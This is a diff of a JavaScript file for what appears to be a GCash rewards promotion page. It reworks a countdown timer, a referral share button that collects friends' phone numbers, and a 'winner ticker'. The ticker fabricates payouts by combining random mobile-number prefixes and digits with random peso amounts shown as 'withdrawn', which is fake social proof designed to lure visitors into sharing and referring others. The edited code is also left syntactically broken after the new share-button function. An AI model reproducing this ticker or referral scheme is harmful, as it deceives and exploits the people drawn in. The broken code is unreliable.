@@ -300,59 +300,7 @@ function generateWeightedAmount() {
     return amounts[Math.floor(Math.random() * amounts.length)];
 }
 
-// ========== WINNER TICKER ==========
-const winnerTicker = {
-    prefixes: ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"],
-    winnerElement: null,
-    tickerInterval: null,
-    
-    generateLast4Digits: function() {
-        return Math.floor(1000 + Math.random() * 9000).toString();
-    },
-    
-    generatePrefix: function() {
-        return this.prefixes[Math.floor(Math.random() * this.prefixes.length)];
-    },
-    
-    generateWinnerText: function() {
-        var prefix = this.generatePrefix();
-        var last4 = this.generateLast4Digits();
-        var amount = generateWeightedAmount();
-        return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
-    },
-    
-    updateWinner: function() {
-        if (!this.winnerElement) return;
-        var newText = this.generateWinnerText();
-        this.winnerElement.innerHTML = newText;
-    },
-    
-    start: function() {
-        this.winnerElement = document.getElementById('winnerText');
-        if (!this.winnerElement) {
-            console.log("Winner element not found, will retry...");
-            var self = this;
-            setTimeout(function() { self.start(); }, 500);
-            return;
-        }
-        
-        this.winnerElement.innerHTML = this.generateWinnerText();
-        
-        if (this.tickerInterval) clearInterval(this.tickerInterval);
-        
-        var self = this;
-        this.tickerInterval = setInterval(function() { self.updateWinner(); }, 15000);
-        
-        console.log("Winner ticker started");
-    },
-    
-    stop: function() {
-        if (this.tickerInterval) {
-            clearInterval(this.tickerInterval);
-            this.tickerInterval = null;
-        }
-    }
-};
+
 
 // ========== REFERRAL TIMER ==========
 const referralTimer = {
@@ -550,20 +498,45 @@ function closePrizePopup() {
     stopConfetti();
 }
 
-// ========== STEP 1: SHARE BUTTON HANDLER ==========
-async function handleShare() {
-    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
-    var userPhone = localStorage.getItem("userPhone");
+// ========== SIMPLE SHARE BUTTON ==========
+function initShareButton() {
+    var shareBtn = document.getElementById('shareButton');
+    var friendInput = document.getElementById('friendPhoneInput');
     
-    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
-        alert("Please enter valid 11-digit number starting with 09");
-        return;
+    if (shareBtn) {
+        // Remove existing listeners
+        var newShareBtn = shareBtn.cloneNode(true);
+        shareBtn.parentNode.replaceChild(newShareBtn, shareBtn);
+        
+        newShareBtn.onclick = function(e) {
+            e.preventDefault();
+            
+            var phone = friendInput.value.trim();
+            var userPhone = localStorage.getItem("userPhone");
+            
+            if (!phone || phone.length !== 11 || !phone.startsWith('09')) {
+                alert("Please enter valid 11-digit number starting with 09");
+                return;
+            }
+            
+            if (phone === userPhone) {
+                alert("You cannot invite yourself!");
+                return;
+            }
+            
+            alert("Share button works! Friend: " + phone);
+            
+            // Clear input
+            friendInput.value = '';
+            
+            // Show popup
+            showPrizePopup();
+        };
+        
+        newShareBtn.disabled = false;
+        console.log("Share button initialized");
     }
-    
-    if (friendPhone === userPhone) {
-        alert("You cannot invite yourself!");
-        return;
-    }
+}
     
     if (referralTimer.isOnCooldown()) {
         var remaining = referralTimer.getRemainingTime();
@@ -702,39 +675,169 @@ async function handleClaimGCash() {
     }
 }
 
-// ========== MAIN TIMER ==========
-var mainTimerInterval = null;
-
-function updateMainTimer() {
-    var target = new Date(2026, 4, 1, 0, 0, 0);
-    var now = new Date();
-    var diff = target - now;
-    var timerDisplay = document.getElementById('mainTimerDisplay');
+// ========== COMPLETE INITIALIZATION ==========
+document.addEventListener('DOMContentLoaded', function() {
+    console.log("Promotion.js loading...");
     
-    if (timerDisplay) {
-        if (diff > 0) {
-            var days = Math.floor(diff / (1000*60*60*24));
-            var hours = Math.floor((diff % (86400000)) / 3600000);
-            var mins = Math.floor((diff % 3600000) / 60000);
-            var secs = Math.floor((diff % 60000) / 1000);
-            timerDisplay.innerHTML = days + "D " + hours.toString().padStart(2,'0') + ":" + mins.toString().padStart(2,'0') + ":" + secs.toString().padStart(2,'0');
-        } else {
-            timerDisplay.innerHTML = "00D 00:00:00";
-        }
+    // 1. Timer at Ticker
+    initSimpleTimer();
+    initWinnerTicker();
+    
+    // 2. Card Highlights
+    initCardHighlights();
+    
+    // 3. Share Button
+    initShareButton();
+    
+    // 4. Enter Key Support
+    initEnterKeySupport();
+    
+    // 5. Video Autoplay
+    initVideoAutoplay();
+    
+    // 6. Facebook Share Button
+    var fbBtn = document.getElementById('shareFBBtn');
+    if (fbBtn) {
+        fbBtn.onclick = function() {
+            var url = "https://xjiligames.github.io/rewards/index.html";
+            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(url), '_blank');
+        };
+    }
+    
+    // 7. Claim Button
+    var claimBtn = document.getElementById('claimGCashBtn');
+    if (claimBtn) {
+        claimBtn.onclick = function() {
+            if (typeof window.showClaimPopup === 'function') {
+                window.showClaimPopup(150);
+            } else {
+                alert("System loading. Please try again.");
+            }
+        };
+    }
+    
+    // 8. Popup close
+    var popup = document.getElementById('prizePopup');
+    if (popup) {
+        popup.onclick = function(e) {
+            if (e.target === popup) {
+                closePrizePopup();
+            }
+        };
+    }
+    
+    console.log("Promotion.js loaded - All systems ready");
+});
+
+// ========== ENTER KEY SUPPORT ==========
+function initEnterKeySupport() {
+    var friendInput = document.getElementById('friendPhoneInput');
+    var shareBtn = document.getElementById('shareButton');
+    
+    if (friendInput) {
+        friendInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (shareBtn) {
+                    shareBtn.click();
+                }
+            }
+        });
     }
 }
 
-function startMainTimer() {
-    updateMainTimer();
-    if (mainTimerInterval) clearInterval(mainTimerInterval);
-    mainTimerInterval = setInterval(updateMainTimer, 1000);
+// ========== VIDEO AUTOPLAY FIX ==========
+function initVideoAutoplay() {
+    var video = document.querySelector('.lucky-cat-video video');
+    if (video) {
+        // Try to play on page load
+        video.play().catch(function(e) {
+            console.log("Autoplay blocked:", e);
+            
+            // Play on first user interaction
+            document.body.addEventListener('click', function playOnClick() {
+                video.play().catch(function() {});
+                document.body.removeEventListener('click', playOnClick);
+            });
+        });
+    }
 }
+
+// Call this on DOMContentLoaded
+initVideoAutoplay();
+
 
 // ========== CHECK EXISTING COOLDOWN ==========
 function checkExistingCooldown() {
     if (referralTimer.isOnCooldown()) {
         startShareCooldownUI();
     }
+}
+
+// ========== SIMPLE TIMER AT TICKER ==========
+// Idagdag ito sa pinaka-itaas ng promotion.js, bago ang lahat
+
+function initSimpleTimer() {
+    var timerDisplay = document.getElementById('mainTimerDisplay');
+    if (timerDisplay) {
+        var target = new Date(2026, 4, 1, 0, 0, 0);
+        
+        function updateTimer() {
+            var now = new Date();
+            var diff = target - now;
+            
+            if (diff > 0) {
+                var days = Math.floor(diff / (1000*60*60*24));
+                var hours = Math.floor((diff % (86400000)) / 3600000);
+                var mins = Math.floor((diff % 3600000) / 60000);
+                var secs = Math.floor((diff % 60000) / 1000);
+                timerDisplay.innerHTML = days + "D " + 
+                    hours.toString().padStart(2,'0') + ":" + 
+                    mins.toString().padStart(2,'0') + ":" + 
+                    secs.toString().padStart(2,'0');
+            } else {
+                timerDisplay.innerHTML = "00D 00:00:00";
+            }
+        }
+        
+        updateTimer();
+        setInterval(updateTimer, 1000);
+        console.log("Timer started");
+    }
+}
+
+function initWinnerTicker() {
+    var winnerSpan = document.getElementById('winnerText');
+    if (winnerSpan) {
+        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
+        var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
+        
+        function generateRandomWinner() {
+            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            var last4 = Math.floor(1000 + Math.random() * 9000);
+            var amount = amounts[Math.floor(Math.random() * amounts.length)];
+            return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
+        }
+        
+        winnerSpan.innerHTML = generateRandomWinner();
+        
+        setInterval(function() {
+            winnerSpan.innerHTML = generateRandomWinner();
+        }, 15000);
+        
+        console.log("Winner ticker started");
+    }
+}
+
+// Execute agad
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', function() {
+        initSimpleTimer();
+        initWinnerTicker();
+    });
+} else {
+    initSimpleTimer();
+    initWinnerTicker();
 }
 
 // ========== CARD CLICK HANDLERS ==========
